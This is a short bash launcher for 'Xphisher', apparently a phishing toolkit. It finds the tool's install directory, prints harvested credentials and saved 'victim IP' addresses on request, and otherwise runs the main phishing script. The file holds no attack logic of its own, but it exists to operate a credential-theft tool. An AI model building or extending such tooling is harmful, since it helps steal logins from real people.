#!/bin/bash

# https://github.com/akrakib/xphisher

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

if [[ $(uname -o) == *'Android'* ]]; then
    XPHISHER_ROOT="/data/data/com.termux/files/usr/opt/xphisher"
elif [[ -f "$REPO_ROOT/xphisher.sh" ]]; then
    XPHISHER_ROOT="$REPO_ROOT"
else
    XPHISHER_ROOT="/opt/xphisher"
fi

case "${1:-}" in
    -h|help)
        echo "To run Xphisher type \`xphisher\` in your cmd"
        echo
        echo "Help:"
        echo " -h | help : Print this menu & Exit"
        echo " -c | auth : View Saved Credentials"
        echo " -i | ip   : View Saved Victim IP"
        echo
        ;;
    -c|auth)
        if [[ -f "$XPHISHER_ROOT/auth/usernames.dat" ]]; then
            cat "$XPHISHER_ROOT/auth/usernames.dat"
        else
            echo "No Credentials Found !"
            exit 1
        fi
        ;;
    -i|ip)
        if [[ -f "$XPHISHER_ROOT/auth/ip.txt" ]]; then
            cat "$XPHISHER_ROOT/auth/ip.txt"
        else
            echo "No Saved IP Found !"
            exit 1
        fi
        ;;
    *)
        if [[ -f "$XPHISHER_ROOT/xphisher.sh" ]]; then
            cd "$XPHISHER_ROOT"
            bash "$XPHISHER_ROOT/xphisher.sh" "$@"
        else
            echo "Unable to locate xphisher.sh in $XPHISHER_ROOT"
            exit 1
        fi
        ;;
esac
